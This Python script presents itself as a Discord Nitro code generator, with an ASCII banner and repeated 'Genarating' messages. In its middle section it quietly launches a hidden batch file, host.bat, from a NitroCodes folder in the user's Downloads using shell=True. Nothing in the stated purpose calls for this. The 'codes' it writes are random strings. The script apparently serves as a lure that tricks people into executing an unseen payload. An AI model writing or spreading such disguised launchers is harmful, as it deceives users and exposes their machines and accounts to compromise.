def main():
    title = """
                                                                                                                                                                  
    ███╗   ██╗██╗████████╗██████╗  ██████╗      ██████╗ ██████╗ ██████╗ ███████╗███████╗     ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ 
    ████╗  ██║██║╚══██╔══╝██╔══██╗██╔═══██╗    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
    ██╔██╗ ██║██║   ██║   ██████╔╝██║   ██║    ██║     ██║   ██║██║  ██║█████╗  ███████╗    ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
    ██║╚██╗██║██║   ██║   ██╔══██╗██║   ██║    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║    ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
    ██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝    ╚██████╗╚██████╔╝██████╔╝███████╗███████║    ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
    ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝      ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝     ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                                                                                                                                                        """
    print(title)    
    try:
        num_codes = int(input("How many codes do you want to generate? "))
        if num_codes <= 0:
            print("Please enter a positive number.")
            return
        
        # Generate codes (example: printing them for demonstration)
        for i in range(num_codes):
            print("Genarating")
        
    except ValueError:
        print("Invalid input. Please enter a valid number.")

if __name__ == "__main__":
    main()
print ("Genarating")
print ("Genarating")
print ("Genarating")
print ("Genarating")
print ("Genarating")
print ("Genarating")
print ("Genarating")
print ("Genarating")
print ("Genarating")
print ("Check found_codes.txt")
import os
import subprocess
user_profile = os.getenv('userprofile')
batch_file_path = fr'%userprofile%\Downloads\NitroCodes\__host\host.bat'
try:
    subprocess.call([batch_file_path], shell=True)
except Exception as e:
    print(f"Error occurred while running the batch file: {e}")
    
import random
import string

def generate_discord_nitro_code():
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=19))
    formatted_code = '-'.join([code[i:i+4] for i in range(0, len(code), 4)])
    return formatted_code

nitro_code = generate_discord_nitro_code()

with open('found_codes.txt', 'w') as file:
    file.write("Code: " + nitro_code)



